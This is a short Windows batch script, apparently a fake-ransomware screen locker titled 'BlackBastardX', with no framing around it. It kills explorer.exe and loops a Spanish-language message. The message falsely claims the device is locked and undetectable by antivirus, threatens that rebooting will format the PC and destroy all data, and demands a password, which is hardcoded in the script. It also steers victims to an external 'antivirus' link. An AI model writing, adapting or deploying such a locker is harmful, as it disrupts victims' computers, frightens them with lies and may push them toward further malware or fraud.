color 0A
@echo off 
title BlackBastardX
taskkill /f /im explorer.exe 
:bucle 
cls    
echo =============================================           
echo            LEE CON ATENCION
echo =============================================
echo  - que paso?
echo  - su dispositivo ha sido bloqueado por blackbastardsX y correo riesgo, este archivo es indetectable por antivirus, por eso no se dio cuenta.
echo  - No reiniciar la computadora
echo  - Al reiniciar el dispositivo se formateara la pc y todos sus datos se perderan para siempre
echo  - Si usted cierra esta ventana se bloqueara su computadora
echo  - Tienes un intento para escribir una contraseña, si no logra acertar tambien perdera todo.
echo  - otra opcion es probar suerte con este antivirus https://antiviruson-cmd.jimdosite.com/ no le aseguramos poder liberarse.
echo =============================================
echo  - Suerte 'BlackBastards
echo =============================================
set /p pass= Escriba aqui el password: 
if %pass%==LUCKYbastard (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades! El password es correcto.
start explorer.exe
pause
exit